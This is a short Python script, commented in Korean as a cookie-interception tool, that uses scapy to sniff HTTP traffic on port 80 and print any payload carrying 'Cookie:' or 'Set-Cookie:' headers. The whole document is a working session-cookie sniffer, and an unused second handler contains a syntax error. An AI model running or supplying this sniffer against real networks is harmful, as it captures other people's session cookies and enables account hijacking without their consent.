#쿠키 정보 가로채기

from scapy.all import *
import re

def cookieSniffer2(packet):
    if packet.haslayer(Raw):
        payload = packet[Raw].load.decode(errors='ignore')

        if 'Cookie:' in payload or 'Set-Cookie:' in payload:
            print('=== COOKIE FOUND ===')
            print(payload)

def cookieSniffer(packet):
	tcp = packet.getlayer('TCP')
	#'Cookie: 문자열‘과 동일한 패턴을 찾기 위해
	cookie = re.search(r'Cookie(.+)', str(tcp.payload))
	
	if cookie:
		print(---'COOKIE SNIFFED\n[%s]' %cookie.group())
	
	
def main():
	print('+++START SNIFFING COOKIE')
	sniff(filter='tcp port 80', store=0, prn=cookieSniffer2)
	

if __name__ == '__main__':
	main()
